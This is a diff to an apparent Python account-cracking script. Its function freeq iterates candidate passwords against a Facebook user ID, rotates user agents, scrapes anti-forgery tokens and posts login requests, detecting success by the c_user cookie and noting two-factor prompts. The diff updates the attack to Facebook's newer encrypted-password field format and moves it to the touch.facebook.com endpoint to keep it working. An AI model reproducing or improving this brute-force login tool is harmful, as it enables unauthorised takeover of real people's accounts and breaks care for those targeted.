@@ -2088,19 +2088,19 @@ def freeq(uid,pwx,tl):
     try:
         for pw in pwx:
             ua = random.choice(uas)
+            time_now = int(datetime.now().timestamp())
+            enc_password = f"#PWD_BROWSER:0:{time_now}:{pw}"
             pro = random.choice(SUMONua)
             ses = requests.Session()
             free_fb = ses.get('https://m.facebook.com').text
-            data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":'',
-            "li":'',
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":pw,
-            "login":"Log In"}
+            data ={
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'next': 'https://m.facebook.com/login/save-device/',
+            'flow': 'login_no_pin',
+            'encpass': enc_password,
+            'login': 'Masuk'}
             headers = {
             'authority': 'm.facebook.com',
             'method': 'GET',
@@ -2119,7 +2119,7 @@ def freeq(uid,pwx,tl):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             po = ses.post(url, data=data, headers=headers).text
             response = ses.cookies.get_dict().keys()
             if "c_user" in response:
